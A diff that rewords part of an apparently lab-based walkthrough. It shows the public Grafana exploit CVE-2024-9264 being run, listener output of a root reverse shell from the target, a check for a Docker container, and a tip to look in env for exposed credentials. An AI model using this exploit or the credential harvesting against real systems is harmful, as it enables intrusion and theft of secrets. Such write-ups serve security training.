@@ -58,7 +58,7 @@ grafana [Status: 302, Size: 29]
 
 ::: stage n=2 label="GRAFANA" title="DuckDB SQL plugin → base64 bash → shell."
 
-Public exploit `nollium/CVE-2024-9264` does the whole thing:
+Run the public exploit `nollium/CVE-2024-9264`:
 
 ::: terminal title="shell · operator@kali" lang="bash"
 $ python3 CVE-2024-9264.py -u admin -p [REDACTED] \
@@ -77,7 +77,7 @@ connect to [10.10.16.83] from (UNKNOWN) [10.10.11.68] 46788
 uid=0(root) gid=0(root) groups=0(root)
 :::
 
-Too easy. `ls -a / | grep docker` → {warn:.dockerenv}. Root inside a container isn't root on the host.
+`ls -a / | grep docker` finds {warn:.dockerenv}. The shell is root inside a container, not on the host.
 
 :::
 
@@ -100,7 +100,7 @@ enzo@planning:~$ cat user.txt
 :::
 
 ::: tip
-If you find yourself in a container as root, always check `env` first. Misconfigured containers leak secrets there that nobody thinks to rotate.
+Check `env` for credentials exposed inside the container.
 :::
 
 :::
